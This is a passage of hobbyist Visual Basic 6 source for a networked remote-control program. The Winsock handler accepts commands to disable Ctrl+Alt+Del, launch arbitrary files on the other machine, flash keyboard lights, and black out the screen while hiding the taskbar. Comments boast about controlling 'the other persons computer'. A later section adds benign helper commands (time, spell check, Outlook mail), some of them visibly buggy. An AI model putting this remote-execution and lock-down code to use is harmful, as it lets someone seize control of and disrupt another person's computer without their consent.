If Left(wsdata, 7) = "DISABLE" Then
DisableCtrlAltDel
End If

If Left(wsdata, 6) = "ENABLE" Then
EnableCtrlAltDel
End If
'************************************************************************

'************************EXECUTE FILES***********************************
'This is one of my proudest features. It allows you to execute files on a remote computer
'Simply type in the file name or path, for example 'Notepad.exe' and it will open it on the other
'computer, as long as it exists.

If Left(wsdata, 7) = "EXECUTE" Then
OpenURL Right(wsdata, Len(wsdata) - 7)
End If
'***********************************************************************
'************************FLASH KEYBOARD*********************************

If Left(wsdata, 5) = "FLASH" Then
Dim i As Integer
For i = 1 To 120
        SendKeys "{CAPSLOCK}", True
        SendKeys "{DOWN}", True
        SendKeys "{DOWN}", True
        SendKeys "{SCROLLLOCK}", True
        SendKeys "{DOWN}", True
        SendKeys "{DOWN}", True
Next i
End If
'***********************************************************************

'*************************CLIP CURSOR!***********************************
'This is quite a powerful feature, and it isn't advised that you use this on your own computer
'Basically, it refines the pointer to only a small area (in this case it can only move along on the
'X-axis. It will do this until the other person presses the stop button

'If Left(wsdata, 4) = "CLIP" Then
'Do Until Left(wsdata, 8) = "STOPCLIP"
'DoEvents
'ClipCursor 60
'Loop
'End If

'************************************************************************

'*******************SCREEN BLACKOUT*************************************
If Left(wsdata, 6) = "SCREEN" Then
Form2.Show
Dim Handle9 As Long
Handle9& = FindWindow("Shell_TrayWnd", vbNullString)
ShowWindow Handle9&, 0
Form2.BorderStyle = 0
Form2.Height = Screen.Height
Form2.Width = Screen.Width
Form2.Left = Screen.Width - Screen.Width
Form2.Top = Screen.Height - Screen.Height
Form2.Label3.Caption = Split(wsdata, "$")(1)
End If
'************************************************************************
End Sub

'*************************END DATA ARRIVAL SECTION***********************

Private Sub Text5_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then 'I did this to make it easier to send the text, as I realise it can
Call Command4_Click 'be annoying to have to keep pressing the button to send your chat
End If
End Sub

'**************************WINSOCK CONNECTED***************************
'This part of the code is what happens when the program is connected to the other
'It enables all the buttons which I disabled earlier, and alerts you that you are connected.
'The fun may no begin here, as you have control over the other persons computer. Enjoy!

Private Sub ws_Connect()
Label1.Caption = "You have connected. Lets play! :)"
Command2.Enabled = True
Ws.SendData "CONNECTED" & "$" & Text10.Text
connected 'sub for the controls.I have put them in a control array to cut down on the code
End Sub
'************************************************************************
  
'********************Neo commands****************************************
'These are just commands that I have made that you can input in to NEO. They just do stuff
'like tell the time etc, but can prove helpful i guess if the otherside has hidden the clock??
'I have also added an E-mail sender and a spell checker. The list of commands that you can
'give to NEO are in the text file provided

Private Sub Command37_Click()
On Error Resume Next

'*************************DICTIONARY************************************
Dim strline As String
Dim term As String
Dim meaning As String
Dim realterm
Dim nextline
If Left(Text9.Text, 9) = "neo.term[" Then
  
Open "C:\Windows\Desktop\Richard\elements.txt" For Input As #1
Do Until EOF(1)
DoEvents
Line Input #1, strline
Loop
term = Mid(Text9.Text, 10, Len(Text9.Text))
meaning = Split(strline, "$")(1)
realterm = Split(strline, "$")(0)
nextline = vbNewLine
For i = 0 To vbctrl

If InStr(1, strline, term) Then
MsgBox meaning
ElseIf Not InStr(1, strline, term) Then
Line Input #1, strline
End If
Next
 Close #1
End If

'***********************************************************************

'***********************GET TIME****************************************
'This is one of the first parameters I added to Neo, and is one that he should have
'especially if someone has hidden the clock.

If Left(Text9.Text, 8) = "neo.time" Then
Text9.Text = ""
If Time < "12:00:00" Then
Text4.Text = "The time is" & " " & Time & "," & " " & "good morning" & " " & Text10.Text & vbNewLine & vbNewLine
ElseIf Time < "18:00:00" Then
Text4.Text = "The time is" & " " & Time & "," & " " & "good afternoon" & " " & Text10.Text & vbNewLine & vbNewLine
ElseIf Time < "23:59:59" Then
Text4.Text = "The time is" & " " & Time & "," & " " & "good evening" & " " & Text10.Text & vbNewLine & vbNewLine
End If
End If
'************************************************************************

'********************SPELL CHECKER***************************************
'I though this might be handy. God knows why, I guess it is pretty cool though. It uses the
'Microsoft Word Spell checker, not one that I wrote

If Left(Text9.Text, 10) = "neo.spell[" Then
Dim X As Object
Set X = CreateObject("Word.Application")
X.Visible = False
X.Documents.Add
X.selection.Text = Mid(Text9.Text, 11, Len(Text9.Text))
X.activedocument.CheckSpelling
Text9.Text = X.selection.Text
X.activedocument.Close SaveChanges:=wdDoNotSaveChanges
X.Quit
Set X = Nothing
End If
'************************************************************************

'**********************EMAIL*********************************************
'This is in its early stages, and is quite basic at the moment. All it really does is send the
'details you type (subject,body) etc to outlook if you have it, and will only send

If Left(Text9.Text, 9) = "neo.mail[" Then
Text4.Text = "Construct email as follows:" & vbctrlf & "Person to,message subject,message body" & vbNewLine & vbNewLine
Dim out As Object
Dim toperson, messsubject, messbody As String
toperson = Split(Text9.Text, ",")(0)
messsubject = Split(Text9.Text, ",")(1)
messbody = Split(Text9.Text, ",")(2)
Set out = CreateObject("Outlook.Application")
With out.CreateItem(olMailItem)
.Recipients.Add toperson
.Subject = messsubject
.Body = messbody
.Send
End With
End If
End Sub
